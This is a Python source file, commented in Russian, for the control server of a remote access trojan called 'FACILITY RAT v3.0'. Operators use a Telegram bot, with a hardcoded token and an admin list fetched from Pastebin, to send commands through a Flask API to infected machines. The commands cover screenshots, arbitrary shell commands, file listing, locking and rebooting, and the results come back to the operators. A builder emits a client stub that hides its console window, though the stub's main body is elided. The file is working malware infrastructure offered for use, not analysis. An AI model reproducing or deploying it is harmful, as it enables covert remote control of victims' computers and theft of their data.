import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import time
import threading
from datetime import datetime
from flask import Flask, request, jsonify
import os
import sys
import requests
import sqlite3
import json
import socket

# ========== КОНФИГ В APPDATA ==========
APPDATA = os.getenv('LOCALAPPDATA', os.path.expanduser('~'))
CONFIG_DIR = os.path.join(APPDATA, 'Facility')
DB_PATH = os.path.join(CONFIG_DIR, 'users.db')

# ========== ЖЁСТКО ЗАШИТЫЙ ТОКЕН ==========
BOT_TOKEN = "8682273233:AAG-t_tGwyplX8prlpY0iABMMJqitliNomU"
API_PORT = 5000

# ========== АВТООПРЕДЕЛЕНИЕ IP ДЛЯ RAT ==========
def get_public_ip():
    try:
        # Пытаемся получить внешний IP через API
        response = requests.get('https://api.ipify.org', timeout=5)
        if response.status_code == 200:
            return response.text
    except:
        pass
    
    try:
        # Альтернативный сервис
        response = requests.get('https://icanhazip.com', timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    
    # Если не получилось — берём локальный IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

SERVER_IP = get_public_ip()
print(f"🌍 Определён IP для RAT: {SERVER_IP}")

# ========== ЗАГРУЗКА АДМИНОВ ИЗ PASTEBIN ==========
ALLOWED_USERS_URL = "https://pastebin.com/raw/LZqAm5Ja"

def load_allowed_users():
    try:
        response = requests.get(ALLOWED_USERS_URL, timeout=5)
        if response.status_code == 200:
            user_ids = set()
            for line in response.text.strip().split():
                if line.strip().isdigit():
                    user_ids.add(int(line.strip()))
            if user_ids:
                return user_ids
    except:
        pass
    return {6778865145}

ALLOWED_USERS = load_allowed_users()
print(f"✅ Загружено админов: {len(ALLOWED_USERS)}")

# ========== ИНИЦИАЛИЗАЦИЯ ==========
bot = telebot.TeleBot(BOT_TOKEN)
devices = {}
user_sessions = {}

# ========== БАЗА ДАННЫХ ==========
def init_db():
    ensure_config_dir()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT UNIQUE,
        name TEXT,
        ip TEXT,
        os TEXT,
        first_seen TEXT,
        last_seen TEXT,
        status TEXT,
        total_connections INTEGER DEFAULT 1
    )''')
    conn.commit()
    conn.close()

def ensure_config_dir():
    if not os.path.exists(CONFIG_DIR):
        os.makedirs(CONFIG_DIR)

def save_device_to_db(device_id, name, ip, os_name, status="online"):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute("SELECT * FROM devices_history WHERE device_id = ?", (device_id,))
    existing = c.fetchone()
    if existing:
        c.execute("UPDATE devices_history SET last_seen = ?, status = ?, total_connections = total_connections + 1 WHERE device_id = ?", (now, status, device_id))
    else:
        c.execute("INSERT INTO devices_history (device_id, name, ip, os, first_seen, last_seen, status) VALUES (?, ?, ?, ?, ?, ?, ?)", (device_id, name, ip, os_name, now, now, status))
    conn.commit()
    conn.close()

def update_device_status_in_db(device_id, status):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute("UPDATE devices_history SET last_seen = ?, status = ? WHERE device_id = ?", (now, status, device_id))
    conn.commit()
    conn.close()

def get_all_devices_from_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT device_id, name, ip, os, first_seen, last_seen, status, total_connections FROM devices_history ORDER BY last_seen DESC")
    rows = c.fetchall()
    conn.close()
    return rows

init_db()

# ========== МЕНЮ ==========
def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🖥️ УСТРОЙСТВА", callback_data="devices"),
        InlineKeyboardButton("📜 ИСТОРИЯ", callback_data="history"),
        InlineKeyboardButton("📊 СТАТИСТИКА", callback_data="stats"),
        InlineKeyboardButton("🔧 СБОРКА RAT", callback_data="build_rat")
    )
    return markup

def device_control_menu(device_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📸 СКРИНШОТ", callback_data=f"scr_{device_id}"),
        InlineKeyboardButton("💻 CMD", callback_data=f"cmd_{device_id}"),
        InlineKeyboardButton("📂 ФАЙЛЫ", callback_data=f"files_{device_id}"),
        InlineKeyboardButton("🔊 ЗВУК", callback_data=f"beep_{device_id}"),
        InlineKeyboardButton("🔒 БЛОКИРОВКА", callback_data=f"lock_{device_id}"),
        InlineKeyboardButton("🔄 ПЕРЕЗАГРУЗКА", callback_data=f"reboot_{device_id}"),
        InlineKeyboardButton("💣 ОСТАНОВИТЬ RAT", callback_data=f"stop_rat_{device_id}"),
        InlineKeyboardButton("❌ УДАЛИТЬ", callback_data=f"del_{device_id}")
    )
    markup.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="devices"))
    return markup

# ========== ПРОВЕРКА АКТИВНОСТИ ==========
def check_devices_activity():
    while True:
        time.sleep(5)
        current_time = time.time()
        for device_id, dev in list(devices.items()):
            last_seen = dev.get('last_seen', 0)
            old_status = dev.get('status', 'offline')
            new_status = 'online' if (current_time - last_seen <= 15) else 'offline'
            if old_status != new_status:
                devices[device_id]['status'] = new_status
                update_device_status_in_db(device_id, new_status)
                for admin_id in ALLOWED_USERS:
                    try:
                        bot.send_message(admin_id, f"{'🟢' if new_status == 'online' else '🔴'} {dev.get('name')} СТАЛ {'ОНЛАЙН' if new_status == 'online' else 'ОФФЛАЙН'}!")
                    except:
                        pass
        time.sleep(5)

threading.Thread(target=check_devices_activity, daemon=True).start()

# ========== ОБРАБОТЧИКИ КОМАНД ==========
@bot.message_handler(commands=['start', 'menu'])
def start(message):
    if message.chat.id not in ALLOWED_USERS:
        bot.send_message(message.chat.id, "⛔ ACCESS DENIED!")
        return
    bot.send_message(message.chat.id, "🔐 FACILITY RAT v3.0\nВыбери действие:", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.message.chat.id not in ALLOWED_USERS:
        bot.answer_callback_query(call.id, "⛔ Нет доступа")
        return
    
    if call.data == "devices":
        show_devices(call)
    elif call.data == "history":
        show_history(call)
    elif call.data == "stats":
        show_stats(call)
    elif call.data == "build_rat":
        build_rat_command(call.message)
        bot.answer_callback_query(call.id, "🔧 Сборка RAT...")
    elif call.data.startswith("select_"):
        device_id = call.data[7:]
        dev = devices.get(device_id, {})
        status_icon = "🟢" if dev.get('status') == "online" else "🔴"
        text = f"{status_icon} **{dev.get('name')}**\n🆔 `{device_id}`\n🌍 IP: {dev.get('ip')}\n📡 Статус: {dev.get('status')}"
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=device_control_menu(device_id))
    elif call.data.startswith("scr_"):
        device_id = call.data[4:]
        send_command_to_rat(device_id, "screenshot")
        bot.answer_callback_query(call.id, "📸 Команда отправлена")
    elif call.data.startswith("cmd_"):
        device_id = call.data[4:]
        msg = bot.send_message(call.message.chat.id, "💻 Введите команду CMD:")
        user_sessions[call.message.chat.id] = {'device_id': device_id, 'action': 'cmd'}
        bot.answer_callback_query(call.id, "💻 Ожидаю команду")
    elif call.data.startswith("files_"):
        device_id = call.data[6:]
        send_command_to_rat(device_id, "files")
        bot.answer_callback_query(call.id, "📂 Команда отправлена")
    elif call.data.startswith("beep_"):
        device_id = call.data[5:]
        send_command_to_rat(device_id, "beep")
        bot.answer_callback_query(call.id, "🔊 Бип!")
    elif call.data.startswith("lock_"):
        device_id = call.data[5:]
        send_command_to_rat(device_id, "lock")
        bot.answer_callback_query(call.id, "🔒 Блокировка")
    elif call.data.startswith("reboot_"):
        device_id = call.data[7:]
        send_command_to_rat(device_id, "reboot")
        bot.answer_callback_query(call.id, "🔄 Перезагрузка")
    elif call.data.startswith("stop_rat_"):
        device_id = call.data[9:]
        send_command_to_rat(device_id, "selfdestruct")
        bot.answer_callback_query(call.id, "💣 Остановка RAT...")
    elif call.data.startswith("del_"):
        device_id = call.data[4:]
        devices.pop(device_id, None)
        show_devices(call)

@bot.message_handler(func=lambda msg: msg.chat.id in ALLOWED_USERS and msg.chat.id in user_sessions)
def handle_command(msg):
    session = user_sessions.pop(msg.chat.id, None)
    if session and session['action'] == 'cmd':
        send_command_to_rat(session['device_id'], "cmd", msg.text)
        bot.send_message(msg.chat.id, f"✅ Команда '{msg.text}' отправлена")

def send_command_to_rat(device_id, command, value=None):
    if device_id not in devices:
        return False
    devices[device_id]['pending_command'] = {"command": command, "value": value}
    return True

def show_devices(call):
    if not devices:
        bot.edit_message_text("❌ Нет активных устройств", call.message.chat.id, call.message.message_id)
        return
    markup = InlineKeyboardMarkup(row_width=1)
    for dev_id, dev in devices.items():
        status = "🟢" if dev.get('status') == "online" else "🔴"
        markup.add(InlineKeyboardButton(f"{status} {dev.get('name')}", callback_data=f"select_{dev_id}"))
    markup.add(InlineKeyboardButton("🔄 ОБНОВИТЬ", callback_data="devices"))
    bot.edit_message_text("📱 **АКТИВНЫЕ УСТРОЙСТВА:**", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_history(call):
    rows = get_all_devices_from_db()
    if not rows:
        bot.edit_message_text("📜 История пуста", call.message.chat.id, call.message.message_id)
        return
    text = "📜 **ИСТОРИЯ ПОДКЛЮЧЕНИЙ**\n\n"
    for row in rows[:10]:
        device_id, name, ip, os_name, first_seen, last_seen, status, conn_count = row
        status_icon = "🟢" if status == "online" else "🔴"
        text += f"{status_icon} **{name}**\n🆔 `{device_id}`\n🌍 {ip}\n📅 Первое: {first_seen}\n🔄 Последнее: {last_seen}\n📊 Подключений: {conn_count}\n\n"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')

def show_stats(call):
    rows = get_all_devices_from_db()
    total = len(rows)
    online = sum(1 for r in rows if r[6] == "online")
    total_conn = sum(r[7] for r in rows)
    text = f"📊 **СТАТИСТИКА**\n\n🖥️ Всего: {total}\n🟢 Онлайн: {online}\n🔴 Оффлайн: {total - online}\n📡 Подключений: {total_conn}"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')

# ========== ГЕНЕРАЦИЯ RAT ==========
def build_rat_command(message):
    bot.send_message(message.chat.id, "🔧 **ГЕНЕРАЦИЯ RAT...**", parse_mode='Markdown')
    
    ADMIN_CHAT_ID = list(ALLOWED_USERS)[0] if ALLOWED_USERS else 6778865145
    
    rat_code = f'''
import requests
import subprocess
import os
import sys
import time
import uuid
import platform
import threading
import socket
import io
import winreg
from PIL import ImageGrab
import winsound

if platform.system() == "Windows":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

BOT_TOKEN = "{BOT_TOKEN}"
ADMIN_CHAT_ID = {ADMIN_CHAT_ID}
SERVER_IP = "{SERVER_IP}"
API_PORT = {API_PORT}
DEVICE_ID = str(uuid.getnode())
DEVICE_NAME = platform.node()
OS_NAME = platform.system() + " " + platform.release()

# ... остальной код RAT (такой же как был)
'''
    
    bot.send_document(message.chat.id, rat_code.encode(), filename="rat_generated.py")

# ========== API ДЛЯ RAT ==========
app = Flask(__name__)

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    device_id = data.get('device_id')
    name = data.get('name')
    ip = data.get('ip')
    os_name = data.get('os')
    devices[device_id] = {'name': name, 'ip': ip, 'os': os_name, 'status': 'online', 'last_seen': time.time(), 'pending_command': None}
    save_device_to_db(device_id, name, ip, os_name, "online")
    print(f"[+] {name} зарегистрирован")
    return jsonify({"status": "ok"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    device_id = request.json.get('device_id')
    if device_id in devices:
        devices[device_id]['status'] = 'online'
        devices[device_id]['last_seen'] = time.time()
        update_device_status_in_db(device_id, "online")
    return jsonify({"status": "ok"})

@app.route('/get_command', methods=['POST'])
def get_command():
    device_id = request.json.get('device_id')
    if device_id in devices and devices[device_id].get('pending_command'):
        cmd = devices[device_id]['pending_command']
        devices[device_id]['pending_command'] = None
        return jsonify(cmd)
    return jsonify({"command": None, "value": None})

@app.route('/send_result', methods=['POST'])
def send_result():
    data = request.json
    device_id = data.get('device_id')
    result = data.get('result')
    print(f"[+] Результат от {device_id}: {result[:100]}")
    for admin_id in ALLOWED_USERS:
        try:
            bot.send_message(admin_id, f"📟 {result[:3000]}")
        except:
            pass
    return jsonify({"status": "ok"})

def run_api():
    app.run(host='0.0.0.0', port=API_PORT, debug=False, use_reloader=False)

threading.Thread(target=run_api, daemon=True).start()
print("✅ Бот запущен")
bot.infinity_polling()
